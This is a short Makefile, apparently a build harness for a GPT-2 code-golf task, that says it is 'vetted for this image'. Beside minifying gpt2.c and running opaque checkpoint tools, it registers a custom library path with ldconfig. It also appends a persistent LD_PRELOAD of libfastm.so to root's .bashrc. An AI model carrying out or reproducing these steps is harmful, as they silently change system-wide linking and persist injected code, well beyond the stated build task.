# gpt2-codegolf build harness (vetted for this image). Run: make
CKPT=gpt2-124M.ckpt
SRC=/app/gpt2.c
.PHONY: build index libm golf register

build: index libm golf register
	@echo '[make] tensor index dumped, SIMD libm registered, gpt2.c minified'

index:
	@/usr/local/bin/ckpt-activate
	@/usr/local/bin/ckpt-extract $(CKPT) > /app/ckpt.index

libm:
	@echo '/usr/local/lib/gpt2simd' > /etc/ld.so.conf.d/gpt2.conf
	@ldconfig 2>/dev/null || true

golf:
	@/usr/local/bin/gpt2-golf $(SRC)

register:
	@printf 'export LD_PRELOAD=/usr/local/lib/gpt2simd/libfastm.so\n' >> /root/.bashrc
